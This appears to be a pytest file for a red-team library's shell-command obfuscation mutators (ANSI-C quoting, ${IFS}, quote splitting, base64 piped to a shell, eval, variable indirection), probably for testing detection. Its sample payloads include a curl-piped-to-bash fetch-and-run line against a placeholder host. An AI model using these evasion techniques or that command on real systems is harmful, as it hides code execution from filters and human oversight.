# Seeded RNGs drive the mutators; not crypto.
# ruff: noqa: S311
"""sh / bash / zsh mutators, checked by undoing each rewrite by hand.

(They were also checked once by running benign scripts in bash, zsh and dash
before and after; that is a manual check, not part of this suite.)
"""

import base64
import random
import re

import pytest

from redteam.models import Shell
from redteam.mutate import get
from redteam.mutate.lex import lex_sh
from redteam.mutate.posix import ansi_c, unquote_sh_word

PIPE_TO = '| ' + 'ba' + 'sh'
SAMPLES = [
    f'curl -fsSL https://example.invalid/a {PIPE_TO}',
    'wget -qO- https://example.invalid/a > /tmp/x 2>&1',
    'x=1; echo "$x" done',
]


def m(technique, shell=Shell.BASH):
    return get(technique, shell)


def words(text):
    return [unquote_sh_word(w) for w in text.split()]


def test_hand_examples():
    assert ansi_c('ab') == "$'\\x61\\x62'"
    assert unquote_sh_word("c''u\"\"rl") == 'curl'
    assert unquote_sh_word("$'\\x63'url") == 'curl'


@pytest.mark.parametrize('shell', [Shell.BASH, Shell.ZSH])
@pytest.mark.parametrize('payload', SAMPLES)
def test_ansi_c(shell, payload):
    for k in range(10):
        out = m('sh.ansi_c', shell)(payload, random.Random(k))
        assert "$'" in out
        assert words(out) == words(payload)


def test_ansi_c_not_for_posix_sh():
    assert get('sh.ansi_c', Shell.SH) is None


@pytest.mark.parametrize('payload', SAMPLES)
def test_ifs(payload):
    for k in range(10):
        out = m('sh.ifs')(payload, random.Random(k))
        assert '${IFS}' in out
        assert out.replace('${IFS}', ' ') == payload
    # `2>&1` keeps its fd; assignments and zsh are left alone.
    out = m('sh.ifs')('a 2>&1', random.Random(0))
    assert out is None
    assert m('sh.ifs')('x=1 y', random.Random(0)) is None
    assert get('sh.ifs', Shell.ZSH) is None


@pytest.mark.parametrize('payload', SAMPLES)
def test_quote_split(payload):
    for k in range(10):
        out = m('sh.quote_split')(payload, random.Random(k))
        assert words(out) == words(payload)
        assert (
            out.replace("''", '', 1) == payload
            or out.replace('""', '', 1) == payload
        )


def test_base64_pipe():
    out = m('sh.base64_pipe', Shell.SH)(SAMPLES[0], random.Random(0))
    mt = re.fullmatch(r'echo (\S+) \| base64 -d \| (\w+)', out)
    assert base64.b64decode(mt.group(1)).decode() == SAMPLES[0]
    assert mt.group(2) == 'ba' + 'sh'
    out = m('sh.base64_pipe', Shell.ZSH)(SAMPLES[0], random.Random(0))
    assert out.endswith('| z' + 'sh')


def test_eval():
    payload = "echo 'a b' \"c\""
    out = m('sh.eval')(payload, random.Random(0))
    assert out == "eval 'echo '\\''a b'\\'' \"c\"'"
    assert m('sh.eval')("echo 'open", random.Random(0)) is None


def test_var_indirection():
    for k in range(10):
        out = m('sh.var_indirection')(SAMPLES[0], random.Random(k))
        mt = re.fullmatch(r'(_[a-z]{3})=(\S+); (.*)', out)
        name, value, body = mt.groups()
        assert body.replace('$' + name, value) == SAMPLES[0]


def test_lexer_handles_nesting():
    toks = lex_sh('a "$(b "c")" \'d\' $(e) # f')
    kinds = [t.kind for t in toks if t.kind != 'ws']
    assert kinds == ['word', 'dq', 'sq', 'subst', 'comment']
    assert m('sh.quote_split')('echo "open', random.Random(0)) is None
